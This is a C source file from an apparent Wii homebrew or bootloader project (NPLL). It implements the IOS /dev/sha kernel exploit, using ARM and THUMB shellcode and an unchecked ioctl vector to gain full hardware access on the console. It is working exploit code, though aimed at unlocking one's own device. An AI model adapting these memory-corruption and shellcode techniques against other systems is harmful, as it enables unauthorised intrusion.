/*
 *
 * NPLL - Wii - IOS /dev/sha exploit
 *
 * Copyright (C) 2025 Techflash
 *
 * Based on:
 *  ios_hax.c - /dev/sha IOS exploit implementation
 *  by Emma / InvoxiPlayGames (https://ipg.gay)
 *
 *  based on the work of https://github.com/mkwcat
 *  (exploit discovery, THUMB shellcode)
*/

#include <stdio.h>
#include <string.h>
#include <npll/cache.h>
#include <npll/regs.h>
#include <npll/utils.h>
#include <npll/timer.h>
#include "ios_ipc.h"

static u32 mem1_prepare[7] = {
	0x4903468D, // ldr r1, =0x10100000; mov sp, r1;
	0x49034788, // ldr r1, =entrypoint; blx r1;
	/* Overwrite reserved handler to loop infinitely */
	0x49036209, // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
	0x47080000, // bx r1
	0x10100000, // temporary stack
	0x41414141, // entrypoint
	0xFFFF0014, // reserved handler
};

static u32 arm_payload[] = {
	0xE3A04536, // mov r4, #0x0D800000
	// HW_AHBPROT = 0xFFFFFFFF
	0xE3E05000, // mov r5, #0xFFFFFFFF
	0xE5845064, // str r5, [r4, #0x64]
	0xE12FFF1E, // bx lr
};

int IOS_DevShaExploit(void) {
	// check if we already have permissions
	if (HW_AHBPROT & AHBPROT_PPCKERN)
		return 0;

	// backup the start, then copy our shellcode to mem1
	u32 *mem1 = (u32 *)MEM1_CACHED_BASE;
	memcpy(mem1, mem1_prepare, sizeof(mem1_prepare));
	// set our payload entrypoint
	mem1[5] = (u32)virtToPhys(arm_payload);
	dcache_flush(mem1, 0x20);

	// open /dev/sha
	int fd = IOS_Open("/dev/sha", IOS_MODE_NONE);
	printf("Opened /dev/sha with fd=%d\r\n", fd);
	// prepare our exploit ioctl
	ios_ioctlv_t vec[3]; // 1 input, 2 output
	vec[0].data = NULL;
	vec[0].size = 0;
	// output SHA-1 context
	// exploit is here! this is kernel idle thread context
	// SHA1_Init will write 0 to the PC save here, since the length
	// of the vector is unchecked
	vec[1].data = (void *)0xFFFE0028;
	vec[1].size = 0;
	// cache consistency
	vec[2].data = MEM1_PHYS_BASE;
	vec[2].size = 0x20;
	// trigger!
	printf("triggering exploit...");
	IOS_Ioctlv(fd, 0, 1, 2, vec);
	printf("returned from trigger\r\n");
	udelay(250 * 1000);
	if (HW_AHBPROT & AHBPROT_PPCKERN)
		return 0;
	else
		return 1;
}
